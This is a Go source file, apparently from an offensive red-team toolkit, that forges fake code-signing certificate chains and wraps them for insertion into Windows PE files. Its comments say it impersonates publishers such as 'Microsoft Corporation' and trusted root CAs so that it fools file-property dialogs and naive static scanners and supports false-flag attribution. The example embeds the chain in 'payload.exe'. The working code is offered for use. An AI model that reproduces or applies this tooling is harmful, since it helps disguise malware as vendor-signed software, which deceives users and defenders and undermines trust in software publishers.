package cert

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"errors"
	"fmt"
	"math/big"
	"time"

	"github.com/secDre4mer/pkcs7"
)

// WIN_CERTIFICATE constants (winnt.h). Mirrored here so the package
// stays free of windows-specific imports — the forge runs on any
// host (Linux CI, macOS) and the result is consumed at PE-write time.
const (
	winCertRevision2_0     uint16 = 0x0200
	winCertTypePKCSSignedData uint16 = 0x0002
)

// ForgeOptions tunes [Forge]. The zero value is invalid — at minimum
// LeafSubject and RootSubject must be set. Validity defaults to
// `[now-1y, now+5y]` so naive "is the cert in date" checks pass for
// the next 5 years.
type ForgeOptions struct {
	// LeafSubject is the leaf (signer) cert subject. This is the
	// publisher name the file-properties dialog displays. Must be
	// set; e.g. `pkix.Name{CommonName: "Microsoft Corporation",
	// Organization: []string{"Microsoft Corporation"}, Country:
	// []string{"US"}}`.
	LeafSubject pkix.Name

	// IntermediateSubject, when set, inserts an intermediate CA
	// between Leaf and Root. Three-tier chains look more legitimate
	// than two-tier (matches real-world publisher → CA → root
	// patterns). Empty CommonName means "no intermediate".
	IntermediateSubject pkix.Name

	// RootSubject is the self-signed root cert subject. Must be set;
	// typically a public root CA name like "DigiCert High Assurance
	// EV Root CA" so naive trust-store grep doesn't notice it's not
	// installed.
	RootSubject pkix.Name

	// KeyBits controls the RSA key size in bits. Zero means 2048.
	// Common values: 2048, 3072, 4096. Larger keys slow down
	// generation; the default is fine for forge purposes.
	KeyBits int

	// ValidFrom, ValidTo bound the cert validity window. Zero =
	// [now - 1y, now + 5y].
	ValidFrom, ValidTo time.Time

	// Content is the data the PKCS#7 SignedData layer will sign.
	// Zero-length means "sign an empty content" — sufficient for
	// the file-properties cosmetic case. Real Authenticode signs
	// an `SpcIndirectDataContent` ASN.1 blob containing the PE
	// hash; populating that here is out of scope for the current
	// minimum-viable forge.
	Content []byte
}

// ForgedChain is the output of [Forge]. The Certificate field is the
// drop-in payload for [Write] / [WriteVia]; the per-cert + per-key
// fields are exposed so operators can re-use the same chain across
// multiple PEs (saves the keygen cost) or extract artefacts for
// analysis.
type ForgedChain struct {
	// Certificate is the WIN_CERTIFICATE-wrapped PKCS#7 SignedData
	// ready to feed [Write].
	Certificate *Certificate

	// Leaf is the signer cert (the one whose Subject the file-
	// properties dialog displays).
	Leaf *x509.Certificate
	// LeafKey is the RSA private key for Leaf.
	LeafKey *rsa.PrivateKey

	// Intermediate is the (optional) intermediate CA cert. nil when
	// ForgeOptions.IntermediateSubject was empty.
	Intermediate *x509.Certificate
	// IntermediateKey is the RSA private key for Intermediate. nil
	// when no intermediate.
	IntermediateKey *rsa.PrivateKey

	// Root is the self-signed root cert.
	Root *x509.Certificate
	// RootKey is the RSA private key for Root.
	RootKey *rsa.PrivateKey
}

// ErrInvalidForgeOptions is returned by [Forge] when LeafSubject or
// RootSubject is missing.
var ErrInvalidForgeOptions = errors.New("cert: ForgeOptions requires LeafSubject + RootSubject")

// Forge generates a self-signed cert chain (Leaf → optional
// Intermediate → self-signed Root) entirely in pure Go and wraps the
// leaf signature into a PKCS#7 SignedData blob inside a
// WIN_CERTIFICATE structure ready for [Write].
//
// The chain is NOT trusted by Windows — `signtool verify` rejects it,
// SmartScreen flags it as unsigned, and any hash-based integrity
// check against the PE bytes fails (the SignedData here doesn't carry
// a real `SpcIndirectDataContent` over the PE hash). What it DOES
// give:
//
//   - The file-properties Details tab shows LeafSubject.CommonName as
//     "Publisher" — fools naive UI-based assessment.
//   - Static scanners that check "does this PE have a SignedData
//     directory entry" without validating it pass.
//   - Memory-forensic tools surface the chain on `signtool dumpcerts`
//     output, which can be useful for false-flag attribution
//     research (red-team exercises explicitly).
//
// For real Authenticode validity, callers need the leaf cert + key
// to be backed by a CA Windows actually trusts (stolen private key,
// purchased EV cert) and they need to sign the canonical Authenticode
// `SpcIndirectDataContent` over the PE's image hash — both out of
// scope here.
//
// Operators commonly chain Forge with [Write]:
//
//	chain, err := cert.Forge(cert.ForgeOptions{
//	    LeafSubject: pkix.Name{CommonName: "Microsoft Corporation"},
//	    RootSubject: pkix.Name{CommonName: "Microsoft Root Certificate Authority"},
//	})
//	if err != nil { /* … */ }
//	if err := cert.Write("payload.exe", chain.Certificate); err != nil { /* … */ }
func Forge(opts ForgeOptions) (*ForgedChain, error) {
	if opts.LeafSubject.CommonName == "" || opts.RootSubject.CommonName == "" {
		return nil, ErrInvalidForgeOptions
	}
	if opts.KeyBits == 0 {
		opts.KeyBits = 2048
	}
	if opts.ValidFrom.IsZero() {
		opts.ValidFrom = time.Now().Add(-365 * 24 * time.Hour)
	}
	if opts.ValidTo.IsZero() {
		opts.ValidTo = time.Now().Add(5 * 365 * 24 * time.Hour)
	}

	rootKey, err := rsa.GenerateKey(rand.Reader, opts.KeyBits)
	if err != nil {
		return nil, fmt.Errorf("generate root key: %w", err)
	}
	root, err := issueCA(opts.RootSubject, rootKey, nil, nil, opts.ValidFrom, opts.ValidTo)
	if err != nil {
		return nil, fmt.Errorf("build root: %w", err)
	}

	signerCA := root
	signerKey := rootKey
	parents := []*x509.Certificate{root}

	var intermediate *x509.Certificate
	var intermediateKey *rsa.PrivateKey
	if opts.IntermediateSubject.CommonName != "" {
		intermediateKey, err = rsa.GenerateKey(rand.Reader, opts.KeyBits)
		if err != nil {
			return nil, fmt.Errorf("generate intermediate key: %w", err)
		}
		intermediate, err = issueCA(opts.IntermediateSubject, intermediateKey, root, rootKey, opts.ValidFrom, opts.ValidTo)
		if err != nil {
			return nil, fmt.Errorf("build intermediate: %w", err)
		}
		signerCA = intermediate
		signerKey = intermediateKey
		parents = []*x509.Certificate{intermediate, root}
	}

	leafKey, err := rsa.GenerateKey(rand.Reader, opts.KeyBits)
	if err != nil {
		return nil, fmt.Errorf("generate leaf key: %w", err)
	}
	leaf, err := signedCert(opts.LeafSubject, leafKey, signerCA, signerKey, opts.ValidFrom, opts.ValidTo)
	if err != nil {
		return nil, fmt.Errorf("build leaf: %w", err)
	}

	// pkcs7.NewSignedData treats nil and []byte{} differently in
	// the resulting DER (omitted vs. zero-length OCTET STRING).
	// Normalise so empty Content always produces the omitted form.
	content := opts.Content
	if len(content) == 0 {
		content = nil
	}
	signedData, err := pkcs7.NewSignedData(content)
	if err != nil {
		return nil, fmt.Errorf("new signed data: %w", err)
	}
	if err := signedData.AddSignerChain(leaf, leafKey, parents, pkcs7.SignerInfoConfig{}); err != nil {
		return nil, fmt.Errorf("add signer chain: %w", err)
	}
	signedBytes, err := signedData.Finish()
	if err != nil {
		return nil, fmt.Errorf("finish signed data: %w", err)
	}

	return &ForgedChain{
		Certificate:     wrapWinCertificate(signedBytes),
		Leaf:            leaf,
		LeafKey:         leafKey,
		Intermediate:    intermediate,
		IntermediateKey: intermediateKey,
		Root:            root,
		RootKey:         rootKey,
	}, nil
}

// issueCA builds a CA certificate. When parent is nil, the cert is
// self-signed (subject == issuer); otherwise parent + parentKey sign
// the new cert.
func issueCA(subject pkix.Name, key *rsa.PrivateKey, parent *x509.Certificate, parentKey *rsa.PrivateKey, notBefore, notAfter time.Time) (*x509.Certificate, error) {
	tmpl, err := caTemplate(subject, notBefore, notAfter)
	if err != nil {
		return nil, err
	}
	if parent == nil {
		parent, parentKey = tmpl, key
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, parent, &key.PublicKey, parentKey)
	if err != nil {
		return nil, err
	}
	return x509.ParseCertificate(der)
}

// signedCert builds a leaf (end-entity, code-signing) certificate
// signed by parent.
func signedCert(subject pkix.Name, key *rsa.PrivateKey, parent *x509.Certificate, parentKey *rsa.PrivateKey, notBefore, notAfter time.Time) (*x509.Certificate, error) {
	tmpl, err := leafTemplate(subject, notBefore, notAfter)
	if err != nil {
		return nil, err
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, parent, &key.PublicKey, parentKey)
	if err != nil {
		return nil, err
	}
	return x509.ParseCertificate(der)
}

func caTemplate(subject pkix.Name, notBefore, notAfter time.Time) (*x509.Certificate, error) {
	serial, err := newSerial()
	if err != nil {
		return nil, err
	}
	return &x509.Certificate{
		SerialNumber:          serial,
		Subject:               subject,
		Issuer:                subject, // CreateCertificate replaces this from the parent for non-self-signed
		NotBefore:             notBefore,
		NotAfter:              notAfter,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
		IsCA:                  true,
	}, nil
}

func leafTemplate(subject pkix.Name, notBefore, notAfter time.Time) (*x509.Certificate, error) {
	serial, err := newSerial()
	if err != nil {
		return nil, err
	}
	return &x509.Certificate{
		SerialNumber:          serial,
		Subject:               subject,
		NotBefore:             notBefore,
		NotAfter:              notAfter,
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageCodeSigning},
		BasicConstraintsValid: true,
	}, nil
}

// newSerial returns a fresh 128-bit random serial. `rand.Reader`
// failures are propagated — silent fallback would risk serial
// collisions across forged chains.
func newSerial() (*big.Int, error) {
	limit := new(big.Int).Lsh(big.NewInt(1), 128)
	return rand.Int(rand.Reader, limit)
}

// wrapWinCertificate prepends the 8-byte WIN_CERTIFICATE header
// (Length, Revision, CertificateType) to the PKCS#7 SignedData blob
// and pads to an 8-byte boundary so the resulting Raw bytes drop
// straight into the PE security directory.
func wrapWinCertificate(signed []byte) *Certificate {
	totalLen := uint32(8 + len(signed))
	padded := align8(totalLen)
	out := make([]byte, padded)
	binary.LittleEndian.PutUint32(out[0:4], totalLen)
	binary.LittleEndian.PutUint16(out[4:6], winCertRevision2_0)
	binary.LittleEndian.PutUint16(out[6:8], winCertTypePKCSSignedData)
	copy(out[8:], signed)
	return &Certificate{Raw: out}
}

// align8 rounds n up to the next 8-byte boundary (WIN_CERTIFICATE
// alignment per PE spec). Shared with cert.go's Write/Strip splice.
func align8(n uint32) uint32 { return (n + 7) &^ 7 }
